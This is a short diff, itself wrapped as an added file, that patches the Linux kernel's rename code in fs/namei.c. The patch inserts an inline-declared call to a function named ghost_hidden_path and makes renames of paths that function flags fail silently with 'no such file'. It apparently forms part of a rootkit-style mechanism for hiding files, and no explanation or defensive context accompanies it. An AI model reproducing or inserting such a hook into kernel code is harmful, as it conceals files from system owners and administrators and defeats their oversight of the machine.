@@ -1,0 +1,16 @@
+--- a/fs/namei.c
++++ b/fs/namei.c
+@@ -4940,6 +4940,13 @@
+ 	error = -ENOENT;
+ 	if (d_is_negative(old_dentry))
+ 		goto exit4;
++	{
++		extern bool ghost_hidden_path(const struct path *gp);
++		struct path gpath = { .mnt = old_path.mnt, .dentry = old_dentry };
++
++		if (ghost_hidden_path(&gpath))
++			goto exit4;
++	}
+ 	new_dentry = lookup_one_qstr_excl(&new_last, new_path.dentry,
+ 					  lookup_flags | target_flags);
+ 	error = PTR_ERR(new_dentry);
